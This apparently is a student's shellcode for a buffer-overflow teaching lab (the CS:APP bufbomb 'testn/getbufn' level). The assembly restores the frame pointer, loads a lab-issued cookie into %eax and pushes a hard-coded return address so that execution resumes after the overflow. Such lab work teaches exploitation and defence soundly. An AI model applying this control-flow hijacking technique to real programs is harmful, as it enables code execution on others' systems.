lea 0x28(%esp), %ebp      #恢复ebp寄存器内容
movl $0x2bf2dd1c,%eax     # get the cookie value (by ./makecookie  zixiang) pay attention to  $
pushl $0x8048e3a          #返回地址指向testn中的getbufn调用后一条指令
ret                       #返回testn继续执行
